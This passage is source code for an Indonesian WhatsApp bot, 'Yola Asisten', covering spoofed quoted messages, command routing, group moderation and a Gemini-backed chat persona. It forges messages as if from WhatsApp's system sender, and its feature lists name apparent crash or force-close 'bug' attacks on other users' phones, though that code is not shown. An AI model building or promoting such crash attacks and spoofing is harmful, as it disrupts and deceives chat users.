                ...(m.chat ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            message: {
                productMessage: {
                    product: {
                        productImage: {
                            mimetype: "image/jpeg",
                            jpegThumbnail: qstoreThumbBuffer
                        },
                        title: `Yola Asisten`,
                        description: null,
                        currencyCode: "IDR",
                        priceAmount1000: "999999999",
                        retailerId: `by ThanDz`,
                        productImageCount: 1
                    },
                    businessOwnerJid: `0@s.whatsapp.net`
                }
            }
        };
        const qchannel = {
            key: {
                remoteJid: "status@broadcast",
                fromMe: false,
                participant: "0@s.whatsapp.net"
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: `120363365678318064@newsletter`,
                    newsletterName: `ThanDz`,
                    jpegThumbnail: await getBuffer(getRandomThumbnailUrl()).catch(() => null),
                    caption: `Yola Asisten Bot`,
                    inviteExpiration: 0
                }
            }
        };
        const qkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(botNumber ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                contactMessage: {
                    displayName: `Yola Asisten`,
                    vcard: `BEGIN:VCARD\nVERSION:1.0\nN:XL;Yola Asisten,;;;\nFN:Yola Asisten\nitem1.TEL;waid=${global.owner[0]}:+${global.owner[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    sendEphemeral: true
                }
            }
        };

        let lolThumbBuffer = null;
        try {
            const tempThumbLol = await getBuffer(getRandomThumbnailUrl());
            if (tempThumbLol) lolThumbBuffer = tempThumbLol;
        } catch {}

        const lol = {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast"
            },
            message: {
                orderMessage: {
                    orderId: "2024",
                    thumbnail: lolThumbBuffer,
                    itemCount: "9741",
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: `Pengirim : @${ m.sender.split("@")[0] }\nPerintah : ${command || 'AI'} - Yola Asisten`,
                    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
                }
            },
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
            }
        };
        const nullgb = {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast"
            },
            message: {
                documentMessage: {
                    contactVcard: true
                }
            }
        };

        if (m.mtype == "interactiveResponseMessage" && m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
            try {
                const params = JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
                const interactiveId = params.id || '';

                if (interactiveId.startsWith(prefix)) {
                    command = interactiveId.slice(prefix.length).trim().split(" ").shift().toLowerCase();
                    isCmd = true;
                    args = interactiveId.slice(prefix.length).trim().split(/ +/).slice(1);
                    q = args.join(" ");
                    text = q;
                    body = interactiveId;
                } else if (interactiveId.startsWith('daftar_role_select_')) {
                    command = 'handle_daftar_role';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('daftar_gender_select_')) {
                    command = 'handle_daftar_gender';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('party_accept_')) {
                    command = 'handle_party_accept';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('guild_accept_req_')) {
                    command = 'handle_guild_accept_req';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('guild_reject_req_')) {
                    command = 'handle_guild_reject_req';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('marry_accept_')) {
                    command = 'handle_marry_accept';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('marry_reject_')) {
                    command = 'handle_marry_reject';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('seks_accept_')) {
                    command = 'handle_seks_accept';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('seks_reject_')) {
                    command = 'handle_seks_reject';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('confirm_divorce_')) {
                    command = 'handle_confirm_divorce';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('cancel_divorce_')) {
                    command = 'handle_cancel_divorce';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('shop_category_select_')) {
                    command = 'handle_shop_category_select';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('confirm_unreg_')) {
                    command = 'confirm_unreg_handler';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('trade_confirm_')) {
                    command = 'handle_trade_confirm';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('trade_reject_')) {
                    command = 'handle_trade_reject';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('party_reject_')) {
                    command = 'handle_party_reject';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('cancel_unreg_')) {
                    command = 'handle_cancel_unreg';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('pinterest_next_')) {
                    command = 'handle_pinterest_next';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('pixivh_next_')) {
                    command = 'handle_pixivh_next';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('nsfw_next_')) {
                    command = 'handle_nsfw_next';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith("yola_ai_set_")) {
                    command = 'handle_yola_ai_set';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('copy_code_')) {
                    command = 'handle_copy_code';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('confess_reply_')) {
                    command = 'handle_confess_reply';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('changepartyname_confirm_')) {
                    command = 'handle_changepartyname_confirm';
                    isCmd = true;
                    body = interactiveId;
                } else if (interactiveId.startsWith('changepartyname_cancel_')) {
                    command = 'handle_changepartyname_cancel';
                    isCmd = true;
                    body = interactiveId;
                }

            } catch (e) {}
        } else if (m.mtype == "buttonsResponseMessage" && body.startsWith(prefix)) {
            command = body.slice(prefix.length).trim().split(" ").shift().toLowerCase();
            isCmd = true;
        } else if (m.mtype == "listResponseMessage" && body.startsWith(prefix)) {
            command = body.slice(prefix.length).trim().split(" ").shift().toLowerCase();
            isCmd = true;
        } else if (m.mtype == "buttonsResponseMessage") {
            if (body.startsWith("confirm_bug_")) {
                command = 'handle_confirm_bug';
                isCmd = true;
            } else if (body.startsWith("cancel_bug_")) {
                command = 'handle_cancel_bug';
                isCmd = true;
            } else if (body.startsWith('trade_confirm_')) {
                command = 'handle_trade_confirm';
                isCmd = true;
            } else if (body.startsWith('trade_reject_')) {
                command = 'handle_trade_reject';
                isCmd = true;
            } else if (body.startsWith('party_accept_')) {
                command = 'handle_party_accept';
                isCmd = true;
            } else if (body.startsWith('guild_accept_req_')) {
                command = 'handle_guild_accept_req';
                isCmd = true;
            } else if (body.startsWith('guild_reject_req_')) {
                command = 'handle_guild_reject_req';
                isCmd = true;
            } else if (body.startsWith('marry_accept_')) {
                command = 'handle_marry_accept';
                isCmd = true;
            } else if (body.startsWith('marry_reject_')) {
                command = 'handle_marry_reject';
                isCmd = true;
            } else if (body.startsWith('seks_accept_')) {
                command = 'handle_seks_accept';
                isCmd = true;
            } else if (body.startsWith('seks_reject_')) {
                command = 'handle_seks_reject';
                isCmd = true;
            } else if (body.startsWith('confirm_divorce_')) {
                command = 'handle_confirm_divorce';
                isCmd = true;
            } else if (body.startsWith('cancel_divorce_')) {
                command = 'handle_cancel_divorce';
                isCmd = true;
            } else if (body.startsWith('confirm_unreg_')) {
                command = 'confirm_unreg_handler';
                isCmd = true;
            } else if (body.startsWith('party_reject_')) {
                command = 'handle_party_reject';
                isCmd = true;
            } else if (body.startsWith('cancel_unreg_')) {
                command = 'handle_cancel_unreg';
                isCmd = true;
            } else if (body.startsWith('pinterest_next_')) {
                command = 'handle_pinterest_next';
                isCmd = true;
            } else if (body.startsWith('pixivh_next_')) {
                command = 'handle_pixivh_next';
                isCmd = true;
            } else if (body.startsWith('nsfw_next_')) {
                command = 'handle_nsfw_next';
                isCmd = true;
            } else if (body.startsWith("yola_ai_set_")) {
                command = 'handle_yola_ai_set';
                isCmd = true;
            }
        }

        if (m.isGroup && !m.key.fromMe && !isOwner && !m.isAdmin) {
            if (AntiLinkGc && /chat\.whatsapp\.com\/(?:invite\/)?([A-Za-z0-9_\-]+)/i.test(body) && m.isBotAdmin) {
                await yola.sendMessage(m.chat, {
                    delete: m.key
                });
                await reply(`────୨ Yola Assistant ৎ────\n@${m.sender.split('@')[0]} Dilarang mengirim link grup lain!`, {
                    mentionedJid: [m.sender]
                });
                return;
            }
            if (AntiLinkAll && /((([A-Za-z]{3,9}:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-_]*)?\??(?:[\-\+=&;%@\.\w_]*)#?(?:[\.\!\/\\\w]*))?)/i.test(body) && !/tiktok\.com|instagram\.com|youtu\.be|youtube\.com|facebook\.com|fb\.watch|twitter\.com|x\.com/i.test(body) && m.isBotAdmin) {
                await yola.sendMessage(m.chat, {
                    delete: m.key
                });
                await reply(`────୨ Yola Assistant ৎ────\n@${m.sender.split('@')[0]} Dilarang mengirim link apapun (selain sosmed umum)!`, {
                    mentionedJid: [m.sender]
                });
                return;
            }
            if (AntiToxic && badwords.some(word => budy?.toLowerCase().includes(word)) && m.isBotAdmin) {
                await yola.sendMessage(m.chat, {
                    delete: m.key
                });
                await reply(`────୨ Yola Assistant ৎ────\n@${m.sender.split('@')[0]} Dilarang toxic/berkata kasar!`, {
                    mentionedJid: [m.sender]
                });
                return;
            }
            if (AntiWame && /wa\.me\//i.test(body) && m.isBotAdmin) {
                await yola.sendMessage(m.chat, {
                    delete: m.key
                });
                await reply(`────୨ Yola Assistant ৎ────\n@${m.sender.split('@')[0]} Dilarang mengirim link wa.me!`, {
                    mentionedJid: [m.sender]
                });
                return;
            }

        }

        const checkCustomCase = (messageBody) => {
            for (const trigger in customCases) {
                if (messageBody.toLowerCase().includes(trigger.toLowerCase())) {
                    return customCases[trigger];
                }
            }
            return null;
        };

        const customResponse = checkCustomCase(budy);
        if (customResponse && !isCmd) {
             await reply(`────୨ Yola Assistant ৎ────\n\n${customResponse}`);
             return;
        }


        const callYolaAI = async (yola, m, question, userName, userRPGData, currentPrefix, replyFn, imageBuffer = null, imageMimeType = null, overridePrompt = null) => {
            if (m.key.fromMe) return;
            let thinkingMsg = null;
            const progressSteps = 10;
            const typingInterval = 40;

            try {
                const typingMsg = `_@${m.sender.split('@')[0]}, Yola Sedang Mengetik..._\n\n[■□□□□□□□□□] 10%`;
                thinkingMsg = await replyFn(typingMsg, {
                    mentionedJid: [m.sender],
                    disableDefaultContext: true
                });

                await yola.sendMessage(m.chat, {
                    /*react: {
                        text: "💖",
                        key: m.key
                    }*/
                });

                for (let i = 2; i <= progressSteps; i++) {
                    const percentage = i * 10;
                    const filled = '■'.repeat(i);
                    const empty = '□'.repeat(progressSteps - i);
                    const newText = `_@${m.sender.split('@')[0]}, Yola Sedang Mengetik..._\n\n[${filled}${empty}] ${percentage}%`;
                    if (thinkingMsg?.key) {
                        await yola.sendMessage(m.chat, {
                            text: newText,
                            edit: thinkingMsg.key,
                            contextInfo: {
                                mentionedJid: [m.sender],
                                disableDefaultContext: true
                            }
                        }).catch(e => {});
                    }
                    await sleep(generateRandomNumber(typingInterval - 40, typingInterval + 40));
                }


                let aiResponse = "";
                const botDev = "ThanDz";
                const rpgFeaturesList = `daftar, unreg, profile, rpgcard, inventory, inv, dungeonlist, dungeon, dungeonstart, dungeoncomplete, heal, shoprpg, buy, sell, marry, acceptmarry, rejectmarry, divorce, confirmdivorce, seks, acceptseks, rejectseks, requestlicense, uprank, trade, accepttrade, rejecttrade, canceltrade, questlist, acceptquest, startquest, abandonquest, queststatus, questcomplete, createguild, joinguild, leaveguild, guildinfo, myguild, acceptguild, rejectguild, kickguild, createparty, inviteparty, acceptparty, leaveparty, kickparty, partyinfo, listhouse, buyhouse, myhouse, jobs, work, jobcomplete, yolarpg, leaderboard, use, release, changepartyname`;
                const aiFeaturesList = `yolaai, yolaa, ai`;
                const bugFeaturesList = `lxz-crash, lxz-fc, lxz-papan, lxz-layy, lxz-hmph, yola-lxz, papanawok, yola-gcx, yola-cgx, tfc`;
                const funFeaturesList = `pinterest, animegecg, animetickle, animefoxgirl, animenom, animecuddle, animeslap, animewaifu, qc, txt2img, tiktok, balogo, hytam, hd, remini, upscale, iptrack, trackip, nglc, angekan, hitamkan, aiimg, geminiimg, brat, brati, bratv`;
                const toolsFeaturesList = `sticker, stiker, sgif, s, brat, brati, bratv, tourl, mediafire, mf, cekid`;
                const nsfwFeaturesList = `hentai-random, trap, hentai-neko, hneko, hentai-waifu, nwaifu, gasm, milf, wecchi, whentai, wmaid, woral, wass, wwaifu, wmilf, pixivh`;
                const groupFeaturesList = `close, clc, open, opc, kick, tendang, hidetag, h, antivirtex, antiwame, antiasing, antitoxic, antilinkall, antilinkgc, addbadword, delbadword`;
                const ownerFeaturesList = `addprem, delprem, self, public, clearsesi, clr, enable, disable, chmv1, chmv2, additem, addgold, addxp, setlevel, resetrpg, yolaai`;
                const confessFeaturesList = `confess`;


                const baseRpgInfo = `Anda adalah Yola Assistant, AI yang sangat membantu, modern, cerdas, dan menjaga kesopan. Jawaban Anda harus ` + '`' + `lengkap` + '`' + `, ` + '`' + `detail` + '`' + `, ` + '`' + `rapi` + '`' + `, terstruktur dengan baik, dan menggunakan bahasa Indonesia yang baik dan benar. Tekankan ` + '`' + `poin-poin penting` + '`' + ` dalam jawaban Anda dengan membungkusnya dalam tanda petik tunggal terbalik (backtick), misalnya ` + '`' + `seperti ini` + '`' + `. Anda bisa menjawab berbagai pertanyaan, termasuk coding dan semua fitur bot ini. Nama Anda adalah Yola Assistant. Bot ini dibuat oleh ${botDev}. Selalu panggil pengguna dengan nama RPG mereka jika ada (contoh: 'Kak ${userName}'), atau nama panggilan mereka jika tidak ada info RPG. Jelaskan fitur-fitur RPG (seperti ${rpgFeaturesList}) dengan jelas, informatif, dan ` + '`' + `mudah dipahami` + '`' + ` jika ditanya. Berikan contoh perintah jika relevan (prefix bot saat ini adalah: '${currentPrefix}'). Fitur lain yang ada di bot ini meliputi: AI (${aiFeaturesList}), Bug (${bugFeaturesList}), Fun (${funFeaturesList}), Tools (${toolsFeaturesList}), NSFW (${nsfwFeaturesList}), Group (${groupFeaturesList}), Owner (${ownerFeaturesList}), Confess (${confessFeaturesList}). JANGAN gunakan '||' untuk memisahkan pesan. Hasilkan satu balasan yang koheren.`;

                let systemPrompt = overridePrompt || baseRpgInfo;

                let currentChatHistory = yolaChatHistories[m.chat] || [];


                /*const tiktokRegex = /(?:download|unduh|ambil)?\s*(?:video)?\s*tiktok(?:\s*dari)?(?:\s*link)?\s*(https?:\/\/(?:www\.)?tiktok\.com\/[^?\s]+)/i;
                const tiktokMatch = question.match(tiktokRegex);
                if (tiktokMatch) {
                    const tiktokUrl = tiktokMatch[1];
                    aiResponse = `────୨ Yola Assistant ৎ────\nOke, Kak ${userName}! Yola bisa bantu download video TikTok dari link itu yaa! Kakak bisa langsung pakai perintah ini: \`${currentPrefix}tiktok ${tiktokUrl}\`\n────୨ Yola Assistant ৎ────`;
                    if (thinkingMsg?.key) {
                        await yola.sendMessage(m.chat, {
                            text: aiResponse,
                            edit: thinkingMsg.key,
                            contextInfo: {
                                mentionedJid: [m.sender],
                                disableDefaultContext: true
                            }
                        }).catch(e => {});
                    } else {
                        await replyFn(aiResponse, {
                            mentionedJid: [m.sender],
                            disableDefaultContext: true
                        });
                    }
                    return;
                }*/

                const groupActionRegex = /yola\s*(buka|tutup)\s*grup(nya)?/i;
                const groupActionMatch = question.match(groupActionRegex);

                if (groupActionMatch && m.isGroup) {
                    let aiResponseMessage = "";
                    if (isOwner || m.isAdmin) {
                        if (!m.isBotAdmin) {
                            aiResponseMessage = `────୨ Yola Assistant ৎ────\nYola mau sih, Kak ${userName}, tapi Yola kan bukan Admin di sini... Jadi gak bisa ${groupActionMatch[1].toLowerCase() === 'buka' ? 'buka' : 'tutup'} grupnya. Coba jadiin Yola Admin dulu yaa?\n────୨ Yola Assistant ৎ────`;
                        } else {
                            const actionType = groupActionMatch[1].toLowerCase() === 'buka' ? 'not_announcement' : 'announcement';
                            const actionText = groupActionMatch[1].toLowerCase() === 'buka' ? 'dibuka' : 'ditutup';
                            try {
                                await yola.groupSettingUpdate(m.chat, actionType);
                                aiResponseMessage = `────୨ Yola Assistant ৎ────\nOkeeh, Kak ${userName}! Grupnya udah Yola ${actionText} nih! Ada lagi yang bisa Yola bantu?\n────୨ Yola Assistant ৎ────`;
                            } catch (e) {
                                aiResponseMessage = `────୨ Yola Assistant ৎ────\nAduuh... Yola gagal ${actionText} grupnya, Kak ${userName}... Soalnya: ${e.message}. Maaf yaa...\n────୨ Yola Assistant ৎ────`;
                            }
                        }
                    } else {
                        aiResponseMessage = `────୨ Yola Assistant ৎ────\nEhehe... cuma Admin atau Owner yang boleh suruh Yola ${groupActionMatch[1].toLowerCase() === 'buka' ? 'buka' : 'tutup'} grup, Kak ${userName}~ Kamu kan bukan... hmph!\n────୨ Yola Assistant ৎ────`;
                    }
                    if (thinkingMsg?.key) {
                        await yola.sendMessage(m.chat, {
                            text: aiResponseMessage,
                            edit: thinkingMsg.key,
                            contextInfo: {
                                mentionedJid: [m.sender],
                                disableDefaultContext: true
                            }
                        }).catch(e => {});
                    } else {
                        await replyFn(aiResponseMessage, {
                            mentionedJid: [m.sender],
                            disableDefaultContext: true
                        });
                    }
                    return;
                }

               /* const imageGenRegex = /yola\s*(buatin|buatkan|generate|bikin|bikinin)\s*gambar\s*(tentang|dari|soal|untuk)?\s*(.+)/i;
                const imageGenMatch = question.match(imageGenRegex);
                if (imageGenMatch && !imageBuffer) {
                    const imagePrompt = imageGenMatch[3].trim();
                    aiResponse = `────୨ Yola Assistant ৎ────\nTentu, Kak ${userName}! Yola bisa bantu bikinin gambar tentang \`${imagePrompt}\`. Kakak bisa langsung pakai perintah ini yaa: \`${currentPrefix}txt2img ${imagePrompt}\`\n────୨ Yola Assistant ৎ────`;

                    if (thinkingMsg?.key) {
                        await yola.sendMessage(m.chat, {
                            text: aiResponse,
                            edit: thinkingMsg.key,
                            contextInfo: {
                                mentionedJid: [m.sender],
                                disableDefaultContext: true
                            }
                        }).catch(e => {});
                    } else {
                        await replyFn(aiResponse, {
                            mentionedJid: [m.sender],
                            disableDefaultContext: true
                        });
                    }
                    return;
                }*/


                let currentConversation = [{
                    role: 'user',
                    parts: [{
                        text: systemPrompt
                    }]
                }, {
                    role: 'model',
                    parts: [{
                        text: "Siap, saya Yola! Ada yang bisa saya bantu?"
                    }]
                }];

                currentChatHistory.forEach(hist => {
                    currentConversation.push({
                        role: hist.role,
                        parts: hist.parts
                    });
                });

                let userMessageParts = [{
                    text: `Pesan dari Kak ${userName}: ${question || '(tidak ada teks)'}`
                }];
                if (imageBuffer && imageMimeType) {
                    const imageBase64 = imageBuffer.toString('base64');
                    userMessageParts.push({
                        inline_data: {
                            mime_type: imageMimeType,
                            data: imageBase64
                        }
                    });
                    userMessageParts[0].text += " (Oh iya, ini ada gambar juga yang dikirim Kakak!)";
                }

                currentConversation.push({
                    role: 'user',
                    parts: userMessageParts
                });


                let requestPayload = {
                    contents: currentConversation,
                    generationConfig: {
                        temperature: 0.65,
                        topP: 0.9,
                        topK: 40,
                        maxOutputTokens: 10000000
                    }
                };

                const response = await axios.post(GEMINI_API_URL, requestPayload, {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                if (response.data.candidates?.[0]?.content?.parts?.[0]?.text) {
                    aiResponse = response.data.candidates[0].content.parts[0].text;
                    yolaChatHistories[m.chat] = yolaChatHistories[m.chat] || [];
                    yolaChatHistories[m.chat].push({
                        role: 'user',
                        parts: userMessageParts
                    });
                    yolaChatHistories[m.chat].push({
                        role: 'model',
                        parts: [{
                            text: aiResponse
                        }]
                    });
                    if (yolaChatHistories[m.chat].length > 14) {
                        yolaChatHistories[m.chat] = yolaChatHistories[m.chat].slice(-14);
                    }
                    saveYolaChatHistories();
                } else {
                    let blockReason = response.data?.promptFeedback?.blockReason || response.data.candidates?.[0]?.finishReason;
                    aiResponse = `Aduuh... Yola lagi ngambek nih, Kak ${userName}. Maaf yaa~`;
                    if (blockReason) aiResponse += ` (Alasan: ${blockReason})`;
                    aiResponse += " Coba lagi nanti yaa~";
                }


                let finalResponseText = `────୨ Yola Assistant ৎ────\n\n${aiResponse}\n\n────୨ Yola Assistant ৎ────`;
                let segments = [];
                const codeBlockRegex = /```(?:\w+)?\n([\s\S]+?)```/g;
                let lastIndex = 0;
                let match;

                while ((match = codeBlockRegex.exec(finalResponseText)) !== null) {
                    if (match.index > lastIndex) {
                        segments.push({
                            type: 'text',
                            content: finalResponseText.substring(lastIndex, match.index)
                        });
                    }
                    segments.push({
                        type: 'code',
                        content: match[1],
                        withButton: true
                    });
                    lastIndex = codeBlockRegex.lastIndex;
                }
                if (lastIndex < finalResponseText.length) {
                    segments.push({
                        type: 'text',
                        content: finalResponseText.substring(lastIndex)
                    });
                }

                if (segments.length > 0) {
                    let firstSegment = segments[0];
                    if (firstSegment.type === 'text') {
                        if (thinkingMsg?.key) {
                            await yola.sendMessage(m.chat, {
                                text: firstSegment.content,
                                edit: thinkingMsg.key,
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    disableDefaultContext: true
                                }
                            }).catch(e => {});
                        } else {
                            await replyFn(firstSegment.content, {
                                mentionedJid: [m.sender],
                                disableDefaultContext: true
                            });
                        }
                        segments.shift();
                    } else if (thinkingMsg?.key) {
                        await yola.sendMessage(m.chat, {
                            delete: thinkingMsg.key
                        }).catch(e => {});
                    }

                    for (const segment of segments) {
                        if (segment.type === 'text') {
                            await replyFn(segment.content, {
                                mentionedJid: [m.sender],
                                disableDefaultContext: true
                            });
                        } else if (segment.type === 'code' && segment.withButton) {
                            const codeContent = segment.content;
                            const interactiveMsg = generateWAMessageFromContent(m.chat, {
                                viewOnceMessage: {
                                    message: {
                                        messageContextInfo: {
                                            deviceListMetadata: {},
                                            deviceListMetadataVersion: 2,
                                            ...(defaultContextInfoBuilder(pushname, command).externalAdReply ? {
                                                externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
                                            } : {})
                                        },
                                        interactiveMessage: proto.Message.InteractiveMessage.create({
                                            body: proto.Message.InteractiveMessage.Body.create({
                                                text: `Berikut adalah kode dari Yola:\n`
                                            }),
                                            footer: proto.Message.InteractiveMessage.Footer.create({
                                                text: "Yola Asisten by ThanDz"
                                            }),
                                            header: proto.Message.InteractiveMessage.Header.create({
                                                title: "📋 Kode Dari Yola",
                                                hasMediaAttachment: false
                                            }),
                                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                                buttons: [{
                                                    name: "cta_copy",
                                                    buttonParamsJson: JSON.stringify({
                                                        display_text: "📋 Salin Kode",
                                                        id: `copy_code_${makeid}`,
                                                        copy_code: codeContent
                                                    })
                                                }]
                                            })
                                        })
                                    }
                                }
                            }, {
                                userJid: m.sender,
                                quoted: m
                            });
                            await yola.relayMessage(m.chat, interactiveMsg.message, {
                                messageId: interactiveMsg.key.id
                            }).catch(e => {});
                        }
                    }
                } else if (thinkingMsg?.key) {
                    await yola.sendMessage(m.chat, {
                        delete: thinkingMsg.key
                    }).catch(e => {});
                }


                await yola.sendMessage(m.chat, {
                    react: {
                        text: "✅",
                        key: m.key
                    }
                }).catch(() => {});


            } catch (error) {
                let errorMsg = `────୨ Yola Assistant ৎ────\nAduuuh! Yola pusing nih, ada error! >.<\n\nErrornya: ${error.message.split('\n')[0]}\n────୨ Yola Assistant ৎ────`;
                if (thinkingMsg?.key) {
                    try {
                        await yola.sendMessage(m.chat, {
                            text: errorMsg,
                            edit: thinkingMsg.key,
                            contextInfo: defaultContextInfoBuilder(pushname, command).externalAdReply
                        });
                    } catch (e) {
                        await replyFn(errorMsg);
                    }
                } else {
                    await replyFn(errorMsg);
                }
                 await yola.sendMessage(m.chat, {
                    react: {
                        text: "❌",
                        key: m.key
                    }
                });
            }
        };


        if (isTalkingToBot && !isCmd) {
            const userRPGData = registeredUsers[m.sender];
            let imageForAI = null;
            let imageMimeForAI = null;
            let questionText = budy;

            if (m.mtype === "imageMessage" && m.message?.imageMessage) {
                questionText = m.message.imageMessage.caption || questionText;
                try {
                    imageForAI = await downloadMediaMessage(m, "buffer", {});
                    imageMimeForAI = m.message.imageMessage.mimetype;
                } catch (e) {
                    imageForAI = null;
                    imageMimeForAI = null;
                }
            } else if (m.quoted?.mtype === "imageMessage" && m.quoted?.message?.imageMessage) {
                questionText = m.quoted.message.imageMessage.caption || questionText;
                try {
                    imageForAI = await downloadMediaMessage(m.quoted, "buffer", {});
                    imageMimeForAI = m.quoted.message.imageMessage.mimetype;
                } catch (e) {
                    imageForAI = null;
                    imageMimeForAI = null;
                }
            } else if (m.quoted?.message?.extendedTextMessage?.text) {
                questionText = m.quoted.message.extendedTextMessage.text;
            } else if (m.quoted?.message?.conversation) {
                 questionText = m.quoted.message.conversation;
            }


            if (m.isGroup) {
                const triggerWords = ['yola', 'rin', `@${botNumber.split('@')[0]}`];
                let cleanedQuestion = questionText;
                triggerWords.forEach(word => {
                    const regexGlobal = new RegExp(`\\b${word.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'gi');
                    cleanedQuestion = cleanedQuestion.replace(regexGlobal, '').trim();
                });
                 cleanedQuestion = cleanedQuestion.replace(new RegExp(`@${botNumber.split('@')[0]}`, 'g'), '').trim();
                questionText = cleanedQuestion;
            }
            
            if (!questionText && !imageForAI) {
                return;
            }

            if (!questionText && imageForAI) questionText = "Jelaskan gambar ini?";

            await callYolaAI(yola, m, questionText, pushname, userRPGData, prefix, reply, imageForAI, imageMimeForAI);
            return;
        }


        const rpgCommands = ["unreg", "profile", "inventory", "inv", "dungeonlist", "dungeon", "dungeonstart", "dungeoncomplete", "heal", "shoprpg", "buy", "sell", "marry", "acceptmarry", "rejectmarry", "divorce", "confirmdivorce", "seks", "acceptseks", "rejectseks", "requestlicense", "uprank", "trade", "accepttrade", "rejecttrade", "canceltrade", "questlist", "acceptquest", "startquest", "abandonquest", "queststatus", "questcomplete", "createguild", "joinguild", "leaveguild", "guildinfo", "myguild", "acceptguild", "rejectguild", "kickguild", "createparty", "inviteparty", "acceptparty", "leaveparty", "kickparty", "partyinfo", "stats", "status", "tas", "sex", "handle_party_accept", "handle_guild_accept_req", "handle_guild_reject_req", "handle_marry_accept", "handle_marry_reject", "handle_seks_accept", "handle_seks_reject", "handle_confirm_divorce", "handle_cancel_divorce", "confirm_unreg_handler", "handle_trade_confirm", "handle_trade_reject", "handle_party_reject", "handle_shop_category_select", "leaderboard", "job", "jobs", "work", "jobcomplete", "yolarpg", "pilihrole", "pilihgender", "use", "release", "rpgcard", "changepartyname", "handle_changepartyname_confirm", "handle_changepartyname_cancel"];
        const commandRequiresRegister = rpgCommands.includes(command);
        const essentialRpgCheckCommands = ['profile', 'inv', 'inventory', 'tas', 'stats', 'status', 'dungeonlist', 'questlist', 'guildinfo', 'partyinfo', 'myguild', 'leaderboard', 'listhouse', 'shoprpg', 'jobs', 'rpgcard'];
        const rpgActionControlCommands = ['dungeon', 'dungeonstart', 'dungeoncomplete', 'acceptquest', 'startquest', 'questcomplete', 'abandonquest', 'queststatus', 'buy', 'sell', 'heal', 'marry', "acceptmarry", "rejectmarry", 'divorce', "confirmdivorce", "handle_confirm_divorce", "handle_cancel_divorce", 'seks', "acceptseks", "rejectseks", "handle_seks_accept", "handle_seks_reject", 'requestlicense', 'uprank', 'trade', 'accepttrade', 'rejecttrade', 'canceltrade', 'buyhouse', 'job', 'work', 'jobcomplete', 'use', 'release', "changepartyname"];


        if (commandRequiresRegister && !isRegistered && !['daftar', 'pilihrole', 'pilihgender', 'handle_daftar_role', 'handle_daftar_gender'].includes(command)) {
            registeredUsers = loadConfig(filePaths.USERS_DB_PATH, {});
            if (!registeredUsers[m.sender]?.rpg) {
                return reply(`────୨ Yola Assistant ৎ────\n⚔️ Anda belum terdaftar sebagai petualang! Silakan ketik: *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);
            }
        }

        if (userRPG?.currentAction && !rpgActionControlCommands.includes(command) && !essentialRpgCheckCommands.includes(command) && !command.startsWith('handle_')) {
            const actionType = userRPG.currentAction.type.split('_')[0];
            const timeNow = Date.now();
            const endTime = userRPG.currentAction.endTime;
            if (timeNow < endTime) {
                const remainingTime = Math.ceil((endTime - timeNow) / 1000);
                const minutes = Math.floor(remainingTime / 60);
                const seconds = remainingTime % 60;
                const busyActionName = userRPG.currentAction.type.replace(/_active/g, ' ').trim();
                return reply(`────୨ Yola Assistant ৎ────\n⏳ Anda sedang sibuk dalam *${capital(busyActionName)}*! Tunggu ${minutes > 0 ? minutes + ' menit ' : ''}${seconds} detik lagi. Gunakan *${prefix}${actionType}complete* setelah waktu habis.\n────୨ Yola Assistant ৎ────`);
            } else {
                const finishedActionName = userRPG.currentAction.type.replace(/_active/g, ' ').trim();
                return reply(`────୨ Yola Assistant ৎ────\n✅ Anda telah menyelesaikan *${capital(finishedActionName)}*! Segera klaim hasilnya dengan *${prefix}${actionType}complete*.\n────୨ Yola Assistant ৎ────`);
            }
